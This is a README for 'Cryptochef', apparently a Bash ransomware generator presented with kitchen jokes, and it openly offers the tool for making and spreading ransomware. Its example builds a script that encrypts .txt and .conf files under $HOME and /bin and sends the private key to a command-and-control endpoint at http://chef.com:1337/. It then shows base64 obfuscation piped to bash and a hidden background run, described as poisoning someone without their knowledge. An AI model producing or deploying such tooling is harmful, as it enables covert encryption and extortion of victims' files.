# Cryptochef - The ransomware kitchen appliance[PREVIEW] 👨‍🍳
## What is
Cryptochef is your new ransomware kitchen appliance. Prepare and spread your favourite Bash GNU/Linux ransomware culinary recipes. Remember! Your fantasy is the best ingredient to cook the best ransomware of the world.

## How to use
```cryptochef.sh [file extension filter] [directory filter] [encrypted extension] [private key size] [command and control endpoint] > [recipient name].sh```

Example:
```cryptochef.sh "(.*?)\.(txt|conf)" "\$HOME /bin" "egg" 4096 http://chef.com:1337/ > omelette.sh```
Cook an omelette that:
- Encrypts all file with *txt* and *conf* extension
- Inside the *$HOME* and */bin* directories,
- Change  its extension to *egg*,
- Uses 4096 bit private key
- Sends the private key to http://chef.com:1337/ endpoint

**Every great culinary recipes are a secret, like Coca Cola, then encode your recipe:**
```
# Encode the recipe
encoded_recipe=$(cat omelette.sh | base64 | tr -d '\n' )
# Taste the recipe
base64 -d <<< ${encoded_recipe} | bash
```

**Do you want to poison someone without him knowing? Fork and hide the venom inside your recipe: 🤢🤢**
```
base64 -d <<< ${encoded_recipe} &>/dev/null &disown; | bash
```
